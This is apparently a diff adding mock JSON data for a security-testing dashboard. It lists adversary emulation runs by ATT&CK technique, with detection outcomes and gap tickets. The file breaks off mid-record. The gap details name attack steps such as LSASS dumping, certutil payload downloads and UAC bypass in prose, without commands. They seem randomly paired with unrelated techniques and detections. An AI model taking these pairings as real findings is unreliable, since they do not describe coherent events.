@@ -1,0 +1,2088 @@
+{
+  "exercises": [
+    {
+      "id": "50000",
+      "ttp": "T1566.001",
+      "simulation": "APT29 Emulation (January 2026 Run 1)",
+      "finding": "APT29 Emulation - Simulated Execution of T1566.001",
+      "outcome": "Alerted",
+      "coverageRating": "Partial",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-01-26T12:15:05.298Z"
+    },
+    {
+      "id": "50001",
+      "ttp": "T1059.001",
+      "simulation": "APT29 Emulation (January 2026 Run 1)",
+      "finding": "APT29 Emulation - Simulated Execution of T1059.001",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-01-28T02:10:43.382Z"
+    },
+    {
+      "id": "50002",
+      "ttp": "T1071.001",
+      "simulation": "APT29 Emulation (January 2026 Run 1)",
+      "finding": "APT29 Emulation - Simulated Execution of T1071.001",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-01-27T19:15:27.897Z"
+    },
+    {
+      "id": "50003",
+      "ttp": "T1078",
+      "simulation": "APT29 Emulation (January 2026 Run 1)",
+      "finding": "APT29 Emulation - Simulated Execution of T1078",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-01-26T13:35:11.739Z"
+    },
+    {
+      "id": "50004",
+      "ttp": "T1003.001",
+      "simulation": "APT29 Emulation (January 2026 Run 1)",
+      "finding": "APT29 Emulation - Simulated Execution of T1003.001",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-01-27T14:46:17.739Z"
+    },
+    {
+      "id": "50005",
+      "ttp": "T1569.002",
+      "simulation": "APT29 Emulation (January 2026 Run 1)",
+      "finding": "APT29 Emulation - Simulated Execution of T1569.002",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-01-28T08:01:07.875Z"
+    },
+    {
+      "id": "50006",
+      "ttp": "T1021.001",
+      "simulation": "APT29 Emulation (January 2026 Run 1)",
+      "finding": "APT29 Emulation - Simulated Execution of T1021.001",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-01-25T03:12:34.954Z"
+    },
+    {
+      "id": "50007",
+      "ttp": "T1190",
+      "simulation": "FIN7 Campaign (February 2026 Run 1)",
+      "finding": "FIN7 Campaign - Simulated Execution of T1190",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-02-21T13:51:11.728Z"
+    },
+    {
+      "id": "50008",
+      "ttp": "T1059.003",
+      "simulation": "FIN7 Campaign (February 2026 Run 1)",
+      "finding": "FIN7 Campaign - Simulated Execution of T1059.003",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-02-22T14:51:41.005Z"
+    },
+    {
+      "id": "50009",
+      "ttp": "T1110.001",
+      "simulation": "FIN7 Campaign (February 2026 Run 1)",
+      "finding": "FIN7 Campaign - Simulated Execution of T1110.001",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-02-18T20:28:53.214Z"
+    },
+    {
+      "id": "50010",
+      "ttp": "T1087.001",
+      "simulation": "FIN7 Campaign (February 2026 Run 1)",
+      "finding": "FIN7 Campaign - Simulated Execution of T1087.001",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-02-18T06:06:59.328Z"
+    },
+    {
+      "id": "50011",
+      "ttp": "T1021.002",
+      "simulation": "FIN7 Campaign (February 2026 Run 1)",
+      "finding": "FIN7 Campaign - Simulated Execution of T1021.002",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-02-21T00:13:11.826Z"
+    },
+    {
+      "id": "50012",
+      "ttp": "T1048.002",
+      "simulation": "FIN7 Campaign (February 2026 Run 1)",
+      "finding": "FIN7 Campaign - Simulated Execution of T1048.002",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-02-19T14:44:08.277Z"
+    },
+    {
+      "id": "50013",
+      "ttp": "T1078.004",
+      "simulation": "Scattered Spider Emulation (February 2026 Run 1)",
+      "finding": "Scattered Spider Emulation - Simulated Execution of T1078.004",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-02-10T03:55:20.717Z"
+    },
+    {
+      "id": "50014",
+      "ttp": "T1098",
+      "simulation": "Scattered Spider Emulation (February 2026 Run 1)",
+      "finding": "Scattered Spider Emulation - Simulated Execution of T1098",
+      "outcome": "Alerted",
+      "coverageRating": "Partial",
+      "status": "Completed",
+      "environment": [
+        "macOS"
+      ],
+      "date": "2026-02-10T15:40:24.432Z"
+    },
+    {
+      "id": "50015",
+      "ttp": "T1566.002",
+      "simulation": "Scattered Spider Emulation (February 2026 Run 1)",
+      "finding": "Scattered Spider Emulation - Simulated Execution of T1566.002",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "macOS"
+      ],
+      "date": "2026-02-11T08:10:53.184Z"
+    },
+    {
+      "id": "50016",
+      "ttp": "T1562.001",
+      "simulation": "Scattered Spider Emulation (February 2026 Run 1)",
+      "finding": "Scattered Spider Emulation - Simulated Execution of T1562.001",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "macOS"
+      ],
+      "date": "2026-02-10T06:13:54.104Z"
+    },
+    {
+      "id": "50017",
+      "ttp": "T1070.004",
+      "simulation": "Scattered Spider Emulation (February 2026 Run 1)",
+      "finding": "Scattered Spider Emulation - Simulated Execution of T1070.004",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Azure / Entra ID"
+      ],
+      "date": "2026-02-10T15:26:41.917Z"
+    },
+    {
+      "id": "50018",
+      "ttp": "T1566",
+      "simulation": "Wizard Spider Ransomware (February 2026 Run 1)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1566",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-02-22T10:16:37.089Z"
+    },
+    {
+      "id": "50019",
+      "ttp": "T1204.002",
+      "simulation": "Wizard Spider Ransomware (February 2026 Run 1)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1204.002",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-02-23T07:04:07.896Z"
+    },
+    {
+      "id": "50020",
+      "ttp": "T1053.005",
+      "simulation": "Wizard Spider Ransomware (February 2026 Run 1)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1053.005",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-02-21T09:08:43.899Z"
+    },
+    {
+      "id": "50021",
+      "ttp": "T1486",
+      "simulation": "Wizard Spider Ransomware (February 2026 Run 1)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1486",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-02-21T18:08:20.539Z"
+    },
+    {
+      "id": "50022",
+      "ttp": "T1490",
+      "simulation": "Wizard Spider Ransomware (February 2026 Run 1)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1490",
+      "outcome": "Alerted",
+      "coverageRating": "Partial",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-02-20T21:38:21.643Z"
+    },
+    {
+      "id": "50023",
+      "ttp": "T1114.002",
+      "simulation": "Wizard Spider Ransomware (February 2026 Run 1)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1114.002",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-02-23T05:31:26.099Z"
+    },
+    {
+      "id": "50024",
+      "ttp": "T1566",
+      "simulation": "Wizard Spider Ransomware (April 2026 Run 2)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1566",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-04-19T22:54:45.434Z"
+    },
+    {
+      "id": "50025",
+      "ttp": "T1204.002",
+      "simulation": "Wizard Spider Ransomware (April 2026 Run 2)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1204.002",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-04-24T16:52:40.501Z"
+    },
+    {
+      "id": "50026",
+      "ttp": "T1053.005",
+      "simulation": "Wizard Spider Ransomware (April 2026 Run 2)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1053.005",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-04-24T00:09:00.595Z"
+    },
+    {
+      "id": "50027",
+      "ttp": "T1486",
+      "simulation": "Wizard Spider Ransomware (April 2026 Run 2)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1486",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-04-20T08:17:07.601Z"
+    },
+    {
+      "id": "50028",
+      "ttp": "T1490",
+      "simulation": "Wizard Spider Ransomware (April 2026 Run 2)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1490",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Completed",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "date": "2026-04-24T14:27:45.993Z"
+    },
+    {
+      "id": "50029",
+      "ttp": "T1114.002",
+      "simulation": "Wizard Spider Ransomware (April 2026 Run 2)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1114.002",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-04-24T15:02:58.258Z"
+    },
+    {
+      "id": "50030",
+      "ttp": "T1133",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1133",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-05-08T09:48:56.025Z"
+    },
+    {
+      "id": "50031",
+      "ttp": "T1543.003",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1543.003",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-05-06T00:44:57.466Z"
+    },
+    {
+      "id": "50032",
+      "ttp": "T1068",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1068",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-05-07T00:28:26.014Z"
+    },
+    {
+      "id": "50033",
+      "ttp": "T1548.002",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1548.002",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-05-08T20:30:37.265Z"
+    },
+    {
+      "id": "50034",
+      "ttp": "T1005",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1005",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-05-05T21:49:33.277Z"
+    },
+    {
+      "id": "50035",
+      "ttp": "T1090.001",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1090.001",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-05-09T17:55:24.855Z"
+    },
+    {
+      "id": "50036",
+      "ttp": "T1082",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1082",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-05-07T21:23:17.075Z"
+    },
+    {
+      "id": "50037",
+      "ttp": "T1133",
+      "simulation": "APT33 Simulation (March 2026 Run 2)",
+      "finding": "APT33 Simulation - Simulated Execution of T1133",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-03-10T22:29:06.536Z"
+    },
+    {
+      "id": "50038",
+      "ttp": "T1543.003",
+      "simulation": "APT33 Simulation (March 2026 Run 2)",
+      "finding": "APT33 Simulation - Simulated Execution of T1543.003",
+      "outcome": "Alerted",
+      "coverageRating": "Partial",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-03-14T10:42:51.010Z"
+    },
+    {
+      "id": "50039",
+      "ttp": "T1068",
+      "simulation": "APT33 Simulation (March 2026 Run 2)",
+      "finding": "APT33 Simulation - Simulated Execution of T1068",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-03-14T00:25:36.714Z"
+    },
+    {
+      "id": "50040",
+      "ttp": "T1548.002",
+      "simulation": "APT33 Simulation (March 2026 Run 2)",
+      "finding": "APT33 Simulation - Simulated Execution of T1548.002",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-03-14T22:45:07.317Z"
+    },
+    {
+      "id": "50041",
+      "ttp": "T1005",
+      "simulation": "APT33 Simulation (March 2026 Run 2)",
+      "finding": "APT33 Simulation - Simulated Execution of T1005",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-03-11T05:44:04.359Z"
+    },
+    {
+      "id": "50042",
+      "ttp": "T1090.001",
+      "simulation": "APT33 Simulation (March 2026 Run 2)",
+      "finding": "APT33 Simulation - Simulated Execution of T1090.001",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-03-14T16:06:36.222Z"
+    },
+    {
+      "id": "50043",
+      "ttp": "T1082",
+      "simulation": "APT33 Simulation (March 2026 Run 2)",
+      "finding": "APT33 Simulation - Simulated Execution of T1082",
+      "outcome": "Alerted",
+      "coverageRating": "Partial",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-03-15T14:07:19.070Z"
+    },
+    {
+      "id": "50044",
+      "ttp": "T1133",
+      "simulation": "APT33 Simulation (April 2026 Run 3)",
+      "finding": "APT33 Simulation - Simulated Execution of T1133",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-05-01T08:30:16.065Z"
+    },
+    {
+      "id": "50045",
+      "ttp": "T1543.003",
+      "simulation": "APT33 Simulation (April 2026 Run 3)",
+      "finding": "APT33 Simulation - Simulated Execution of T1543.003",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-05-03T04:03:55.481Z"
+    },
+    {
+      "id": "50046",
+      "ttp": "T1068",
+      "simulation": "APT33 Simulation (April 2026 Run 3)",
+      "finding": "APT33 Simulation - Simulated Execution of T1068",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-05-01T08:32:38.049Z"
+    },
+    {
+      "id": "50047",
+      "ttp": "T1548.002",
+      "simulation": "APT33 Simulation (April 2026 Run 3)",
+      "finding": "APT33 Simulation - Simulated Execution of T1548.002",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-05-03T01:44:13.441Z"
+    },
+    {
+      "id": "50048",
+      "ttp": "T1005",
+      "simulation": "APT33 Simulation (April 2026 Run 3)",
+      "finding": "APT33 Simulation - Simulated Execution of T1005",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-05-02T08:02:02.876Z"
+    },
+    {
+      "id": "50049",
+      "ttp": "T1090.001",
+      "simulation": "APT33 Simulation (April 2026 Run 3)",
+      "finding": "APT33 Simulation - Simulated Execution of T1090.001",
+      "outcome": "Prevented",
+      "coverageRating": "Optimal",
+      "status": "Completed",
+      "environment": [
+        "Linux"
+      ],
+      "date": "2026-05-04T02:21:32.540Z"
+    },
+    {
+      "id": "50050",
+      "ttp": "T1082",
+      "simulation": "APT33 Simulation (April 2026 Run 3)",
+      "finding": "APT33 Simulation - Simulated Execution of T1082",
+      "outcome": "Alerted",
+      "coverageRating": "Partial",
+      "status": "Completed",
+      "environment": [
+        "Windows Server"
+      ],
+      "date": "2026-05-04T06:47:14.559Z"
+    }
+  ],
+  "gaps": [
+    {
+      "id": "90000",
+      "displayId": "GAP-1761",
+      "ttp": "T1078",
+      "simulation": "APT29 Emulation (January 2026 Run 1)",
+      "finding": "APT29 Emulation - Simulated Execution of T1078",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Open",
+      "severity": "Critical",
+      "priorityScore": 90,
+      "createdDate": "2026-01-26T13:35:11.739Z",
+      "resolvedDate": null,
+      "resolutionNotes": null,
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "ticketLink": "JIRA-3039",
+      "details": "Execution: Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.\nDetection: Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response."
+    },
+    {
+      "id": "90001",
+      "displayId": "GAP-5787",
+      "ttp": "T1003.001",
+      "simulation": "APT29 Emulation (January 2026 Run 1)",
+      "finding": "APT29 Emulation - Simulated Execution of T1003.001",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "In Progress",
+      "severity": "Critical",
+      "priorityScore": 90,
+      "createdDate": "2026-01-27T14:46:17.739Z",
+      "resolvedDate": null,
+      "resolutionNotes": null,
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "ticketLink": "JIRA-2125",
+      "details": "Execution: Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.\nDetection: CrowdStrike blocked the execution of SharpHound. Generated High severity incident."
+    },
+    {
+      "id": "90002",
+      "displayId": "GAP-9098",
+      "ttp": "T1110.001",
+      "simulation": "FIN7 Campaign (February 2026 Run 1)",
+      "finding": "FIN7 Campaign - Simulated Execution of T1110.001",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "In Progress",
+      "severity": "Low",
+      "priorityScore": 50,
+      "createdDate": "2026-02-18T20:28:53.214Z",
+      "resolvedDate": null,
+      "resolutionNotes": null,
+      "actionItems": "Review and tune EDR prevention policies for this host group.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Server"
+      ],
+      "ticketLink": "JIRA-3962",
+      "details": "Execution: Modified registry keys to achieve persistence via Run keys. Validated survival after reboot.\nDetection: CrowdStrike blocked the execution of SharpHound. Generated High severity incident."
+    },
+    {
+      "id": "90003",
+      "displayId": "GAP-4295",
+      "ttp": "T1087.001",
+      "simulation": "FIN7 Campaign (February 2026 Run 1)",
+      "finding": "FIN7 Campaign - Simulated Execution of T1087.001",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Resolved",
+      "severity": "High",
+      "priorityScore": 70,
+      "createdDate": "2026-02-18T06:06:59.328Z",
+      "resolvedDate": "2026-02-20T06:35:16.658Z",
+      "resolutionNotes": "Implemented new CrowdStrike IOA rule to block this behavior.",
+      "actionItems": "Patch the vulnerable application to the latest version.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Server"
+      ],
+      "ticketLink": "JIRA-2237",
+      "details": "Execution: Attempted to bypass UAC using fodhelper.exe. Command executed as standard user but failed to elevate privileges.\nDetection: Windows Defender flagged the file as malicious and quarantined it immediately."
+    },
+    {
+      "id": "90004",
+      "displayId": "GAP-9181",
+      "ttp": "T1078.004",
+      "simulation": "Scattered Spider Emulation (February 2026 Run 1)",
+      "finding": "Scattered Spider Emulation - Simulated Execution of T1078.004",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Resolved",
+      "severity": "Critical",
+      "priorityScore": 90,
+      "createdDate": "2026-02-10T03:55:20.717Z",
+      "resolvedDate": "2026-03-11T19:57:10.060Z",
+      "resolutionNotes": "Updated Splunk correlation search to detect this specific command line argument.",
+      "actionItems": "Engineer a new detection rule in the SIEM for this activity.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "ticketLink": "JIRA-6602",
+      "details": "Execution: Injected shellcode into explorer.exe to evade detection. C2 connection established.\nDetection: Detected registry modification via Carbon Black, but alert was buried under low-fidelity noise."
+    },
+    {
+      "id": "90005",
+      "displayId": "GAP-3086",
+      "ttp": "T1566",
+      "simulation": "Wizard Spider Ransomware (February 2026 Run 1)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1566",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Resolved",
+      "severity": "High",
+      "priorityScore": 70,
+      "createdDate": "2026-02-22T10:16:37.089Z",
+      "resolvedDate": "2026-03-14T22:15:19.077Z",
+      "resolutionNotes": "Updated Splunk correlation search to detect this specific command line argument.",
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Server"
+      ],
+      "ticketLink": "JIRA-3244",
+      "details": "Execution: Injected shellcode into explorer.exe to evade detection. C2 connection established.\nDetection: No alert generated in SIEM. Found evidence of execution in Sysmon Event ID 1 during retrospective hunt."
+    },
+    {
+      "id": "90006",
+      "displayId": "GAP-1052",
+      "ttp": "T1486",
+      "simulation": "Wizard Spider Ransomware (February 2026 Run 1)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1486",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Resolved",
+      "severity": "Medium",
+      "priorityScore": 50,
+      "createdDate": "2026-02-21T18:08:20.539Z",
+      "resolvedDate": "2026-03-22T14:27:29.105Z",
+      "resolutionNotes": "Implemented new CrowdStrike IOA rule to block this behavior.",
+      "actionItems": "Patch the vulnerable application to the latest version.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "ticketLink": "JIRA-4448",
+      "details": "Execution: Executed PowerShell download cradle to pull secondary payload. Payload failed to execute due to execution policy.\nDetection: Analyst noted abnormal volume of DNS requests to a newly registered domain. Created custom detection rule."
+    },
+    {
+      "id": "90007",
+      "displayId": "GAP-8165",
+      "ttp": "T1114.002",
+      "simulation": "Wizard Spider Ransomware (February 2026 Run 1)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1114.002",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Resolved",
+      "severity": "High",
+      "priorityScore": 70,
+      "createdDate": "2026-02-23T05:31:26.099Z",
+      "resolvedDate": "2026-02-28T15:06:34.445Z",
+      "resolutionNotes": "Updated Splunk correlation search to detect this specific command line argument.",
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Server"
+      ],
+      "ticketLink": "JIRA-3291",
+      "details": "Execution: Ran simulated ransomware payload. 500 files encrypted before process crashed.\nDetection: Authentication logs show successful logon from unusual IP. Conditional Access policy did not block it."
+    },
+    {
+      "id": "90008",
+      "displayId": "GAP-8048",
+      "ttp": "T1204.002",
+      "simulation": "Wizard Spider Ransomware (April 2026 Run 2)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1204.002",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Resolved",
+      "severity": "Critical",
+      "priorityScore": 90,
+      "createdDate": "2026-04-24T16:52:40.501Z",
+      "resolvedDate": "2026-05-02T07:05:44.200Z",
+      "resolutionNotes": "Updated Splunk correlation search to detect this specific command line argument.",
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "ticketLink": "JIRA-1220",
+      "details": "Execution: Injected shellcode into explorer.exe to evade detection. C2 connection established.\nDetection: Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered."
+    },
+    {
+      "id": "90009",
+      "displayId": "GAP-4826",
+      "ttp": "T1053.005",
+      "simulation": "Wizard Spider Ransomware (April 2026 Run 2)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1053.005",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Risk Accepted",
+      "severity": "High",
+      "priorityScore": 70,
+      "createdDate": "2026-04-24T00:09:00.595Z",
+      "resolvedDate": null,
+      "resolutionNotes": null,
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Server"
+      ],
+      "ticketLink": "JIRA-4251",
+      "details": "Execution: Dumped LSASS memory using procdump.exe. File saved to C:\\Temp\\lsass.dmp.\nDetection: Windows Defender flagged the file as malicious and quarantined it immediately."
+    },
+    {
+      "id": "90010",
+      "displayId": "GAP-7731",
+      "ttp": "T1490",
+      "simulation": "Wizard Spider Ransomware (April 2026 Run 2)",
+      "finding": "Wizard Spider Ransomware - Simulated Execution of T1490",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Resolved",
+      "severity": "Medium",
+      "priorityScore": 50,
+      "createdDate": "2026-04-24T14:27:45.993Z",
+      "resolvedDate": "2026-04-29T13:11:56.943Z",
+      "resolutionNotes": "Implemented new CrowdStrike IOA rule to block this behavior.",
+      "actionItems": "Require MFA for all service accounts.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Workstation"
+      ],
+      "ticketLink": "JIRA-6936",
+      "details": "Execution: Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.\nDetection: Windows Defender flagged the file as malicious and quarantined it immediately."
+    },
+    {
+      "id": "90011",
+      "displayId": "GAP-2460",
+      "ttp": "T1543.003",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1543.003",
+      "outcome": "Logged",
+      "coverageRating": "Minimal",
+      "status": "Resolved",
+      "severity": "Critical",
+      "priorityScore": 90,
+      "createdDate": "2026-05-06T00:44:57.466Z",
+      "resolvedDate": "2026-05-28T22:41:39.982Z",
+      "resolutionNotes": "Configured Azure AD Conditional Access to block legacy authentication protocols.",
+      "actionItems": "Implement network segmentation to prevent lateral movement.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Linux"
+      ],
+      "ticketLink": "JIRA-6079",
+      "details": "Execution: Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.\nDetection: EDR alerted on suspicious PowerShell activity. Analyst triaged and isolated host within 15 minutes."
+    },
+    {
+      "id": "90012",
+      "displayId": "GAP-8184",
+      "ttp": "T1548.002",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1548.002",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Resolved",
+      "severity": "Critical",
+      "priorityScore": 90,
+      "createdDate": "2026-05-08T20:30:37.265Z",
+      "resolvedDate": "2026-05-29T15:51:39.264Z",
+      "resolutionNotes": "Implemented new CrowdStrike IOA rule to block this behavior.",
+      "actionItems": "Engineer a new detection rule in the SIEM for this activity.",
+      "stakeholders": "Detection Engineering",
+      "environment": [
+        "Windows Server"
+      ],
+      "ticketLink": "JIRA-3207",
+      "details": "Execution: Attempted lateral movement via WMI to domain controller. Access denied due to lack of privileges.\nDetection: Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered."
+    },
+    {
+      "id": "90013",
+      "displayId": "GAP-9526",
+      "ttp": "T1005",
+      "simulation": "APT33 Simulation (May 2026 Run 1)",
+      "finding": "APT33 Simulation - Simulated Execution of T1005",
+      "outcome": "Missed",
+      "coverageRating": "None",
+      "status": "Resolved",
+      "severity": "High",
+      "priorityScore": 70,
